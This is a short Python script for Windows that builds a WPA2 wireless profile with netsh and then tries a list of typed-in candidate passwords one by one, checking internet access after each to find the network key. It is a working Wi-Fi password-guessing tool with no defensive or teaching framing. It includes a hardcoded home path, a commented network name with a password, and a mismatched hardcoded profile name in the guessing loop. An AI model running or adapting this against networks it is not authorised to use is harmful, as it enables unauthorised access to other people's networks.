import time
from itertools import product
import os
import binascii
import socket
os.system("echo off")
def createNewConnection(name, SSID, password='00000000'):
    t = bytes(name, "cp1251")
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>""" + name + """</name>
    <SSIDConfig>
        <SSID>
            <hex>""" + str(binascii.hexlify(t))[2:-1] + """</hex>
            <name>""" + SSID + """</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>""" + password + """</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    command = 'netsh wlan add profile filename="C:/Users/Houjo/PycharmProjects/pythonProject/' + name + '.xml" user=all'+' >nul 2>&1'
    #print(command)
    with open(name + ".xml", 'w') as file:
        file.write(config)
    os.system(command)


#set profileparameter name="Beeline_5G_FF2447" keyMaterial="wifi1551"
#connect name="Beeline_5G_FF2447"

def connect(name, SSID):
    command = f'netsh wlan connect name={name}'+' >nul 2>&1'
    os.system(command)


name = input("Name of Wi-Fi: ")
createNewConnection(name, name)
connect(name,name)
# connect(name, name)
# input()
# command=r'netsh wlan set profileparameter name="Beeline_5G_FF2447" keyMaterial="wifi1551"'
# os.system(command)
# input()
# connect(name, name)

def is_connected():
    try:
        sock=socket.create_connection(('1.1.1.1',80))
        if sock is not None:
            sock.close()
        return True
    except OSError:
        pass
    return False



def iter_pass():
    print('введите возможные пароли')
    y=[x for x in input().split()]
    print()
    for x in y:
        command = 'netsh wlan set profileparameter name="Honor5" keyMaterial="'+x+'" >nul 2>&1'
        os.system(command)
        time.sleep(0.7)
        if is_connected():
            print(x,'is pass')
            break
        else:
            print(x,'   no.  ://')
iter_pass()
print('end')